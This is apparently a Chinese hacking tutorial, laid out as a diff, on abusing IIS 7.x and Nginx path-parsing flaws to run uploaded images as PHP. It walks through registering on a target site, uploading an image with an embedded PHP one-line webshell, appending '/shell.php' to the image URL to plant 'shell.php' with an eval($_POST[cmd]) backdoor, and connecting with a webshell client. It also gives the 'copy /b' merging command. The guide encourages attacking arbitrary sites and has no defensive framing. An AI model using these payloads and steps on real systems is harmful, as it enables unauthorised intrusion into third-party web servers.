@@ -1,0 +1,44 @@
+首先，测试是不是有解析漏洞。
+iis7.5
+.php
+http://www.xxxx.com/UploadFiles</a>\image\php.jpg/.php
+
+找了一张logo 图片。格式：http://lxhacker.org/logo.jpg/p.php
+
+发现可以正常打开。。用菜刀连接下，是php脚本
+
+再次测试 /p.asp   爆出404
+
+说明 解析 php
+
+然后随便注册一个会员。上传一个php脚本，修改成 jpg的格式
+
+地址后面加上 /p.php  正常解析成为 php 脚本
+
+
+先说一下Nginx那个0day（出来有几天了，因为介绍的网站很多，所以当时就没转载）
+
+先合并一张php一句话图片马，合并方法：
+①、DOS合并：copy 1.gif /b + 1.txt/a asp.gif
+②、用edjpgcom，进行图片和一句话木马的合并，一句话代码为“<?fputs(fopen(“shell.php”,”w”),”<?eval(\$_POST[cmd]);?>”)?>”
+图片随便找一张.
+【顺带着说一下edjpgcom的使用方法：打开edjpgcom.exe所在文件夹，然后把你所要修改的图片拖动到edjpgcom.exe上面，然后edjpgcom.exe会自动打开，写入想要些的代码即可】
+一句话:<?php fputs(fopen(‘shell.php’,'w’),’<?php eval($_POST[cmd])?>’);?>
+然后找个nginx的站,先注册一个用户然后在论坛上传一张我们刚刚合并的图片一句话马。
+找到图片地址,然后在地址后面加个shell.php，在浏览器中运行。
+比如假设图片地址为www.llsilver.com/tupian/1.jpg
+则执行地址为www.llsilver.com/tupian/1.jpg/shell.php 
+然后,会在目录下生成shell.php。比如:www.llsilver.com/tupian/shell.php
+shell.php就是我们的一句话地址。再拿一句话的客户端连接这个一句话地址就好。
+
+上面就是Nginx拿站全过程，IIS7.0的畸形解析和这个类似。
+
+找到某个使用IIS7.0架设的站，然后找到其中的图片上传点（不需要管理权限，普通注册用户即可搞定），把PHP大马后缀改成.jpg，传上去，得到图片地址。
+
+在图片格式后面添加xx.php xx随便你怎么填。只要后缀为.php就好。
+
+剩下的就随便你去搞吧。
+
+
+
+
